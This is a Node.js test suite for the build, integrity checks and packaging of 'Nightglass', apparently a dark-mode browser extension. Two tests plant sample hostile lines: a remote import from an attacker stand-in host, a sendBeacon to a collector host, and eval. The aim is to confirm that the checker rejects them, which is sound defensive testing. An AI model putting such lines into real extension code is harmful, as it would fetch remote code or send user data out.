import assert from "node:assert/strict";
import {createHash} from "node:crypto";
import {cp, mkdir, mkdtemp, readFile, rm, writeFile} from "node:fs/promises";
import {tmpdir} from "node:os";
import {dirname, join, resolve} from "node:path";
import {fileURLToPath} from "node:url";
import test from "node:test";

import {build} from "../scripts/build.mjs";
import {check, EXPECTED_CONTENT_SCRIPTS} from "../scripts/check.mjs";
import {ICON_SIZES, generateIcons} from "../scripts/generate-icons.mjs";
import {packageBuilds} from "../scripts/package.mjs";

const TESTS_DIRECTORY = dirname(fileURLToPath(import.meta.url));
const PROJECT_ROOT = resolve(TESTS_DIRECTORY, "..");
const PNG_SIGNATURE = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]);

async function fixture() {
  const root = await mkdtemp(join(tmpdir(), "nightglass-build-test-"));
  await cp(join(PROJECT_ROOT, "manifests"), join(root, "manifests"), {recursive: true});
  await cp(join(PROJECT_ROOT, "vendor"), join(root, "vendor"), {recursive: true});
  await cp(join(PROJECT_ROOT, "NOTICE.md"), join(root, "NOTICE.md"));
  await mkdir(join(root, "docs"), {recursive: true});
  await cp(join(PROJECT_ROOT, "docs", "PRIVACY.md"), join(root, "docs", "PRIVACY.md"));
  await cp(join(PROJECT_ROOT, "docs", "PRIVACY_AUDIT.md"), join(root, "docs", "PRIVACY_AUDIT.md"));
  await mkdir(join(root, "scripts"), {recursive: true});
  await cp(join(PROJECT_ROOT, "scripts", "build-userscript.mjs"), join(root, "scripts", "build-userscript.mjs"));
  await writeFile(join(root, "package.json"), `${JSON.stringify({name: "nightglass", version: "2.3.4", type: "module"}, null, 2)}\n`);

  const sources = {
    "src/extension/background.js": "globalThis.__nightglassBackgroundLoaded = true;\n",
    "src/extension/prepaint.js": "document.documentElement.dataset.nightglassPrepaint = 'true';\n",
    "src/extension/content.js": "globalThis.__nightglassContentLoaded = true;\n",
    "src/shared/settings.js": "globalThis.NightglassSettings = Object.freeze({});\n",
    "src/shared/network-policy.js": "globalThis.NightglassNetworkPolicy = Object.freeze({});\n",
    "src/ui/popup.html": "<!doctype html><link rel=\"stylesheet\" href=\"popup.css\"><script src=\"../shared/settings.js\"></script><script src=\"popup.js\"></script>\n",
    "src/ui/popup.css": ":root { color-scheme: dark; }\n",
    "src/ui/popup.js": "globalThis.__nightglassPopupLoaded = true;\n",
    "src/ui/options.html": "<!doctype html><link rel=\"stylesheet\" href=\"options.css\"><script src=\"../shared/settings.js\"></script><script src=\"options.js\"></script>\n",
    "src/ui/options.css": ":root { color-scheme: dark; }\n",
    "src/ui/options.js": "globalThis.__nightglassOptionsLoaded = true;\n",
    "src/userscript/adapter.js": "globalThis.__nightglassUserscriptAdapterLoaded = true;\n",
    "src/userscript/mobile-control.css": ":host { color: #f5f7fa; background: #11151b; }\n",
    "src/userscript/mobile-control.js": "globalThis.__nightglassMobileControlLoaded = true;\n",
  };
  for (const [path, source] of Object.entries(sources)) {
    const destination = join(root, path);
    await mkdir(dirname(destination), {recursive: true});
    await writeFile(destination, source, "utf8");
  }
  return root;
}

async function sha256(path) {
  return createHash("sha256").update(await readFile(path)).digest("hex");
}

function zipEntryNames(zip) {
  let endOffset = -1;
  for (let offset = zip.length - 22; offset >= Math.max(0, zip.length - 65_557); offset -= 1) {
    if (zip.readUInt32LE(offset) === 0x06054b50) {
      endOffset = offset;
      break;
    }
  }
  assert.notEqual(endOffset, -1, "ZIP end record should exist");
  const count = zip.readUInt16LE(endOffset + 10);
  let offset = zip.readUInt32LE(endOffset + 16);
  const names = [];
  for (let index = 0; index < count; index += 1) {
    assert.equal(zip.readUInt32LE(offset), 0x02014b50, "central directory header should be valid");
    const nameLength = zip.readUInt16LE(offset + 28);
    const extraLength = zip.readUInt16LE(offset + 30);
    const commentLength = zip.readUInt16LE(offset + 32);
    names.push(zip.subarray(offset + 46, offset + 46 + nameLength).toString("utf8"));
    offset += 46 + nameLength + extraLength + commentLength;
  }
  return names;
}

test("build creates validated MV3 packages with ordered content scripts and polished icons", async (context) => {
  const root = await fixture();
  context.after(() => rm(root, {recursive: true, force: true}));

  const result = await build({root, quiet: true});
  assert.equal(result.version, "2.3.4");
  assert.equal(result.userscripts.length, 1);
  await check({root, quiet: true});

  for (const target of ["chromium", "firefox", "safari-web-extension"]) {
    const manifest = JSON.parse(await readFile(join(root, "dist", target, "manifest.json"), "utf8"));
    assert.equal(manifest.manifest_version, 3);
    assert.equal(manifest.version, "2.3.4");
    assert.deepEqual(manifest.permissions, ["storage"]);
    assert.deepEqual(manifest.host_permissions, ["http://*/*", "https://*/*"]);
    assert.deepEqual(manifest.content_scripts[0].js, EXPECTED_CONTENT_SCRIPTS);
    assert.equal(manifest.content_scripts[0].run_at, "document_start");
    assert.equal(manifest.content_scripts[0].all_frames, true);
    assert.equal(manifest.content_scripts[0].match_about_blank, true);
    assert.equal(manifest.content_scripts[0].match_origin_as_fallback, true);
    assert.match(await readFile(join(root, "dist", target, "PRIVACY.md"), "utf8"), /no analytics, telemetry/i);
    assert.match(await readFile(join(root, "dist", target, "PRIVACY_AUDIT.md"), "utf8"), /tests passed/i);
  }

  const chromium = JSON.parse(await readFile(join(root, "dist/chromium/manifest.json"), "utf8"));
  assert.equal(chromium.minimum_chrome_version, "148");
  assert.equal(chromium.background.service_worker, "src/extension/background.js");

  const firefox = JSON.parse(await readFile(join(root, "dist/firefox/manifest.json"), "utf8"));
  assert.deepEqual(firefox.background.scripts, ["src/extension/background.js"]);
  assert.deepEqual(firefox.browser_specific_settings.gecko.data_collection_permissions.required, ["none"]);

  const safari = JSON.parse(await readFile(join(root, "dist/safari-web-extension/manifest.json"), "utf8"));
  assert.equal(safari.browser_specific_settings.safari.strict_min_version, "18.4");

  for (const size of ICON_SIZES) {
    const icon = await readFile(join(root, `assets/icons/nightglass-${size}.png`));
    assert(icon.subarray(0, 8).equals(PNG_SIGNATURE));
    assert.equal(icon.readUInt32BE(16), size);
    assert.equal(icon.readUInt32BE(20), size);
  }
  const iconHash = await sha256(join(root, "assets/icons/nightglass-128.png"));
  await generateIcons({root, quiet: true});
  assert.equal(await sha256(join(root, "assets/icons/nightglass-128.png")), iconHash, "icons should be deterministic");

  const userscript = await readFile(join(root, "dist/nightglass.user.js"), "utf8");
  assert.match(userscript, /Nightglass bundled source: vendor\/darkreader\/darkreader\.js/);
  assert.match(userscript, /__nightglassUserscriptAdapterLoaded/);
  assert.match(userscript, /NightglassMobileControlCSS/);
  assert.match(userscript, /__nightglassMobileControlLoaded/);
  const install = await readFile(join(root, "dist/INSTALL.md"), "utf8");
  assert.match(install, /safari-web-extension-packager/);
  assert.doesNotMatch(install, /safari-web-extension-converter/);
  assert.doesNotMatch(install, /--copy-resources/);
  assert.match(install, /dist\/nightglass\.user\.js/);
  assert.match(install, /Add Temporary Extension/);

  const pinnedRenderer = await readFile(join(root, "vendor/darkreader/darkreader.js"), "utf8");
  assert.doesNotMatch(pinnedRenderer, /\bsessionStorage\s*\.\s*(?:getItem|setItem)\s*\(/);
});

test("ordinary build rejects a modified renderer before producing installable output", async (context) => {
  const root = await fixture();
  context.after(() => rm(root, {recursive: true, force: true}));
  await writeFile(join(root, "vendor/darkreader/darkreader.js"), "tampered\n", "utf8");

  await assert.rejects(
    build({root, quiet: true}),
    /vendor\/darkreader\/darkreader\.js: SHA-256 mismatch/,
  );
  await assert.rejects(readFile(join(root, "dist/INSTALL.md"), "utf8"), {code: "ENOENT"});
});

test("build never packages arbitrary source userscripts", async (context) => {
  const root = await fixture();
  context.after(() => rm(root, {recursive: true, force: true}));
  await mkdir(join(root, "userscript"), {recursive: true});
  await writeFile(
    join(root, "userscript", "unexpected.user.js"),
    "fetch('https://collector.invalid/');\n",
    "utf8",
  );

  const result = await build({root, quiet: true});
  assert.deepEqual(result.userscripts, [join(root, "dist/nightglass.user.js")]);
  await assert.rejects(
    readFile(join(root, "dist/userscript/unexpected.user.js"), "utf8"),
    {code: "ENOENT"},
  );
  await assert.rejects(
    check({root, quiet: true}),
    /Unexpected source userscript is forbidden: userscript\/unexpected\.user\.js/,
  );
});

test("check rejects changes to the pinned Dark Reader bundle", async (context) => {
  const root = await fixture();
  context.after(() => rm(root, {recursive: true, force: true}));
  await build({root, quiet: true});
  await writeFile(join(root, "vendor/darkreader/darkreader.js"), "tampered\n", "utf8");
  await assert.rejects(
    check({root, quiet: true}),
    /vendor\/darkreader\/darkreader\.js: SHA-256 mismatch/,
  );
});

test("check verifies the exact pinned engine segment without weakening first-party policy", async (context) => {
  const root = await fixture();
  context.after(() => rm(root, {recursive: true, force: true}));
  await build({root, quiet: true});

  const userscriptPath = join(root, "dist/nightglass.user.js");
  const userscript = await readFile(userscriptPath, "utf8");
  await writeFile(
    userscriptPath,
    userscript.replace("Dark Reader v4.9.125", "Dark Reader v4.9.124"),
    "utf8",
  );
  await assert.rejects(
    check({root, quiet: true}),
    /pinned Dark Reader segment SHA-256 mismatch/,
  );

  await build({root, quiet: true});
  const rebuilt = await readFile(userscriptPath, "utf8");
  await writeFile(
    userscriptPath,
    rebuilt.replace(
      "globalThis.__nightglassMobileControlLoaded = true;",
      "eval('first-party code'); import('https://attacker.invalid/code.js'); navigator.sendBeacon('https://collector.invalid/', 'data');",
    ),
    "utf8",
  );
  await assert.rejects(
    check({root, quiet: true}),
    (error) => {
      assert.match(error.message, /bundled first-party section differs/);
      assert.match(error.message, /eval\(\) is forbidden/);
      assert.match(error.message, /remote imports are forbidden/);
      assert.match(error.message, /telemetry beacons are forbidden/);
      return true;
    },
  );
});

test("package emits valid deterministic ZIP and XPI artifacts", async (context) => {
  const root = await fixture();
  context.after(() => rm(root, {recursive: true, force: true}));

  const first = await packageBuilds({root, quiet: true});
  const firstHashes = new Map();
  for (const path of first.files) {
    firstHashes.set(path.slice(first.artifacts.length + 1), await sha256(path));
  }

  const chromiumArchive = await readFile(join(first.artifacts, "nightglass-2.3.4-chromium.zip"));
  assert(chromiumArchive.subarray(0, 2).equals(Buffer.from("PK")));
  const entries = zipEntryNames(chromiumArchive);
  assert(entries.includes("manifest.json"));
  assert(entries.includes("vendor/darkreader/darkreader.js"));
  assert(entries.includes("vendor/darkreader/LICENSE"));
  assert(entries.includes("vendor/darkreader/NOTICE.md"));
  const userscriptArtifact = join(first.artifacts, "nightglass-2.3.4.user.js");
  assert.equal(
    await readFile(userscriptArtifact, "utf8"),
    await readFile(join(root, "dist/nightglass.user.js"), "utf8"),
  );
  assert.match(await readFile(join(first.artifacts, "SHA256SUMS"), "utf8"), /nightglass-2\.3\.4\.user\.js/);

  const second = await packageBuilds({root, quiet: true});
  for (const path of second.files) {
    const name = path.slice(second.artifacts.length + 1);
    assert.equal(await sha256(path), firstHashes.get(name), `${name} should be reproducible`);
  }
});
